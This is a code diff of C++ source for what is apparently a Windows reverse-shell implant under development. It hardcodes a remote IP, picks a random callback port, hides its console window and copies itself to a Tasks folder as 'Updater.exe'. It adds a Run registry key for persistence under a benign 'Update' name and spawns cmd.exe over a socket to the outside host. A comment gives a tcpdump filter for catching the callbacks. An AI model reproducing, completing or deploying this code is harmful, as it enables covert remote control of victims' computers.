@@ -14,6 +14,10 @@
 using namespace std;
 #pragma comment(lib, "Ws2_32.lib")
 
+//REGEXP tcpdump -i ens3 | grep -E '\.1[0-9]{3}\ '
+// The exe will moove itself to C:\Windows\Task\Update.exe
+// A startup key will be created under HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run 
+
 #define DEFAULT_BUFLEN 1024
 #define BUFSIZE MAX_PATH
 void BindSock(char* rhost, int rport);
@@ -32,27 +36,37 @@ void MooveExe() {
 	CopyFileA(test, "C:\\Windows\\Tasks\\Updater.exe", true);
 }
 
-int main(int argc, char** argv) {
-	//FreeConsole(); // This is the way to make the cmd vanish
-	char rhost[] = "XXXXX"; // ip to connect to
-	int rport = 8081;
-		
+void CreateKey() {
+	std::wstring progPath = L"C:\\Windows\\Tasks\\Updater.exe";
+	HKEY hkey = NULL;
+	LONG createStatus = RegCreateKey(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", &hkey); //Creates a key       
+	LONG status = RegSetValueEx(hkey, L"Update", 0, REG_SZ, (BYTE*)progPath.c_str(), (progPath.size() + 1) * sizeof(wchar_t));
+}
 
-	MooveExe();
-	cin.get();
-	//BindSock(rhost, rport);
+int main(int argc, char** argv) {
+	FreeConsole(); // This is the way to make the cmd vanish
+	char rhost[] = "51.75.30.35"; // ip to connect to
+
+	int low_dist = 1000;
+	int high_dist = 2000;
+	std::srand((unsigned int)std::time(nullptr));
+	int port = low_dist + std::rand() % (high_dist - low_dist);
+	cout << port << "\n";
+		
+	//MooveExe();
+	//CreateKey();
+	/*while (1) {
+		BindSock(rhost, port);
+		Sleep(60000);
+	}*/
 	return 0;	
 }
 
 
-void CreateKey() {
-	std::wstring progPath = L"C:\\Users\\%USERNAME%\\AppData\\Roaming\\Updater.exe";
-	HKEY hkey = NULL;
-	LONG createStatus = RegCreateKey(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", &hkey); //Creates a key       
-	LONG status = RegSetValueEx(hkey, L"MyApp", 0, REG_SZ, (BYTE*)progPath.c_str(), (progPath.size() + 1) * sizeof(wchar_t));
-}
+
 void BindSock(char* rhost, int rport) {
-	/*while (1) {*/
+	
+	cout << rport << "\n";
 	SECURITY_ATTRIBUTES saAttr;
 	saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
 	saAttr.bInheritHandle = TRUE;
@@ -106,10 +120,11 @@ void BindSock(char* rhost, int rport) {
 	printf("[*] Created process props\n");
 
 	CHAR commandLine[255];
-	strcpy_s(commandLine,255,"cmd.exe");
+	strcpy_s(commandLine, 255, "cmd.exe");
 
 	CreateProcessA(NULL, commandLine, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
 	WaitForSingleObject(pi.hProcess, INFINITE);
 	CloseHandle(pi.hProcess);
 	CloseHandle(pi.hThread);
+	
 }
